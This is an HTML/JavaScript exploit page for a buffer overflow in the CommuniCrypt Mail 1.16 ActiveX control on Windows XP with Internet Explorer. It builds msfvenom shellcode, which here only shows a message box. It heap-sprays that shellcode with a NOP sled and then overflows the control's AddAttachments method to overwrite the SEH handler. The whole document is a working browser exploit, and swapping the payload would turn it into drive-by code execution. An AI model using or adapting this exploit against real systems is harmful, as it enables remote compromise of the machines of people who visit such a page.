<!-- Load the AOSMTP Mail Object -->
// Exploit:   CommuniCrypt Mail 1.16 (ANSMTP.dll/AOSMTP.dll) ActiveX
// Tested on: Windows XP Pro SP3 - IE7/6

<html>
	<head>
		<object id="falafel" classid="clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82"></object>
	</head>
	<body>
		<script>
			//msfvenom -p windows/messagebox TITLE="Crash Override" TEXT="falafel is life" -f js_le -v shellcode
			//No platform was selected, choosing Msf::Module::Platform::Windows from the payload
			//No Arch selected, selecting Arch: x86 from the payload
			//No encoder or badchars specified, outputting raw payload
			//Payload size: 272 bytes
			//Final size of js_le file: 816 bytes
			var shellcode = unescape('%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6468%u5865%u6820%u7265%u6972%u6868%u4f20%u6876%u7243%u7361%udb31%u5c88%u0e24%ue389%u6968%u6566%u6858%u7369%u6c20%u6668%u6c65%u6820%u6166%u616c%uc931%u4c88%u0f24%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855');

			var bigblock = unescape('%u9090%u9090');
			var headersize = 20;
			var slackspace = headersize + shellcode.length;
			while (bigblock.length < slackspace) bigblock += bigblock;
			var fillblock = bigblock.substring(0,slackspace);
			var block = bigblock.substring(0,bigblock.length - slackspace);
			while (block.length + slackspace < 0x40000) block = block + block + fillblock;
			var memory = new Array();
			for (i = 0; i < 500; i++){ memory[i] = block + shellcode }
			alert("Spray done, ready to trigger crash!");
		
			//trigger the crash
			filler = "";
			while (filler.length < 272) filler+= "\x41";
			//          filler  +         EIP        +                filler              +        nSEH         +        SEH
			payload = filler + "\x42\x42\x42\x42" + "\x43\x43\x43\x43\x43\x43\x43\x43" +  "\x44\x44\x44\x44" + "\x06\x06\x06\x06";
			falafel.AddAttachments(payload);
		</script>
	</body>
</html>
